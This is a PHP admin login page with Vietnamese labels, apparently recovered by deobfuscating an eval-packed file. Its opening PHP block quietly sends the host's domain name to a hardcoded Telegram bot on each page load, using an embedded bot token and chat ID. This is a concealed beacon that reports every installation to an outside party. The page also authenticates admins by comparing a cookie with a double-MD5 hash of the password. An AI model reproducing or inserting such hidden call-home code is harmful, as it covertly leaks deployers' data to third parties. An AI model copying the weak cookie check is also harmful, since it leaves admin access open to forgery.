<?php

$Gpal6gts = "base64_decode";
/* #1: PHPDeobfuscator eval output */ 
    error_reporting(0);
    session_start();
    include "acc_admin.php";
    if ($_COOKIE["admin"] == md5(md5($matkhau))) {
        header("location: /admin/index.php?loai=fb");
    }
    // Thiết lập thông tin Telegram
    $telegramBotToken = '6296860736:AAHdHmYGTXi9p6NnHqzjiJ3ftyvYQCz1MNY';
    $telegramChatId = '-864512189';
    // Lấy tên miền hiện tại
    $currentDomain = $_SERVER['SERVER_NAME'];
    // Gửi tên miền đến Telegram
    $message = 'Tên miền hiện tại: ' . $currentDomain;
    $telegramUrl = "https://api.telegram.org/bot6296860736:AAHdHmYGTXi9p6NnHqzjiJ3ftyvYQCz1MNY/sendMessage";
    $telegramParams = ['chat_id' => $telegramChatId, 'text' => $message];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParams);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    curl_close($ch);
    // Kiểm tra kết quả gửi tin nhắn
    if ($response === false) {
        echo "";
    } else {
        echo "";
    }
    ?>

<html lang="en" dir="ltr" data-theme-color="default">
	<head>

		<meta charset="UTF-8">
		<meta name='viewport' content='width=device-width, initial-scale=1.0, user-scalable=0'>
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<title> Admin - Quản Trị Viên </title>
		<link rel="icon" href="assets/img/brand/favicon.ico" type="image/x-icon"/>
	    <link id="style" href="assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" >
        <link rel="preload" as="style" href="assets/app-b1603905.css" /><link rel="preload" as="style" href="assets/app-27b4a2c7.css" /><link rel="stylesheet" href="assets/app-b1603905.css" /><link rel="stylesheet" href="assets/app-27b4a2c7.css" />
            <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
        
	</head>

	<body class="ltr error-page1 bg-primary">

    	<!-- Progress bar on scroll -->
		<div class="progress-top-bar"></div>

        <!-- Back-to-top -->
        <a href="#top" id="back-to-top" class="back-to-top rounded-circle shadow"><i class="las la-arrow-up"></i></a>

		<!-- Loader -->
		<div id="global-loader" >
			<img src="assets/img/loader.svg" class="loader-img" alt="loader">
		</div>
		<!-- /Loader -->

        <div class="square-box">
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
		</div>

        
        <div class="bg-svg">
			<div class="page" >
				<div class="z-index-10">
					<div class="container">
						<div class="row">
							<div class="col-xl-5 col-lg-6 col-md-8 col-sm-8 col-xs-10 mx-auto my-auto py-4 justify-content-center">
								<div class="card-sigin">
									<!-- Demo content-->
									<div class="main-card-signin d-md-flex">
										<div class="wd-100p">
											<div class="d-flex">
												<a href="zem/index">
													<img src="assets/img/brand/favicon-white.png" class="sign-favicon ht-40 logo-dark" alt="logo">
													<img src="assets/img/brand/favicon-white-1.png" class="sign-favicon ht-40 logo-light-theme" alt="logo">
												</a>
											</div>
											<div class="mt-3">
												<h2 class="tx-medium tx-primary">Welcome back!</h2>
												<h6 class="font-weight-semibold mb-4 text-muted">chào mừng bạn đến với trang quản trị viên.</h6>
												<div class="panel tabs-style7 scaleX mt-2">
												
													<div class="panel-body p-0">
														<div class="tab-content mt-3">
															<div class="tab-pane active" id="signinTab1">
																
																	<div class="form-group">
																		<input class="form-control" id="username" placeholder="Tài khoản" type="text">
																	</div>
																	<div class="form-group">
																		<input class="form-control" id="password" placeholder="Mật khẩu" type="password">
																	</div>
																	<div class="d-flex align-items-center justify-content-between">
																	
																		<button onclick="login()" class="btn btn-primary">Đăng nhập</button>
																	</div>
																
																
															
															</div>
														
														</div>
													</div>
												</div>
												
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>


        <!-- SCRIPTS -->
        <!-- JQUERY JS -->
        <script src="assets/plugins/jquery/jquery.min.js"></script>
</script>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 
        <!-- BOOTSTRAP JS -->
        <script src="assets/plugins/bootstrap/js/popper.min.js"></script>
        <script src="assets/plugins/bootstrap/js/bootstrap.bundle.min.js"></script> 

        <!--Internal  Perfect-scrollbar js -->
        <script src="assets/plugins/perfect-scrollbar/perfect-scrollbar.min.js"></script>  
        
        
		<!-- generate-otp js -->
		<link rel="modulepreload" href="assets/generate-otp-406ebfd2.js" /><script type="module" src="assets/generate-otp-406ebfd2.js"></script>
        

        <!-- APP JS-->   
		<link rel="modulepreload" href="assets/app-2392f432.js" /><link rel="modulepreload" href="assets/apexcharts.common-7928d148.js" /><script type="module" src="assets/app-2392f432.js"></script>        <!-- END SCRIPTS -->
		
        <!-- sticky js-->
		<script src="assets/sticky.js"></script>
		<script>
		      function login(){
		        
		          var username =$("#username").val()
		          var password =$("#password").val()
       $.ajax({
    url: 'api.php?action=login',
    type: 'POST',
    data: {
        username: username,
        password: password
    },
    dataType: 'json',
    success: function(data) {
        if(data.status == "success"){
      Swal.fire(
  'Thành công!',
  data.message,
  'success'
)
location.reload();
}else if(data.status == "error"){
          Swal.fire(
  'Lỗi!',
  data.message,
  'error'
)
}
    },
    error: function(jqXHR, textStatus, errorThrown) {
        // xử lý lỗi
    }
});
      }
		</script>
	</body>
</html>
<?php 
/* END:#1 */
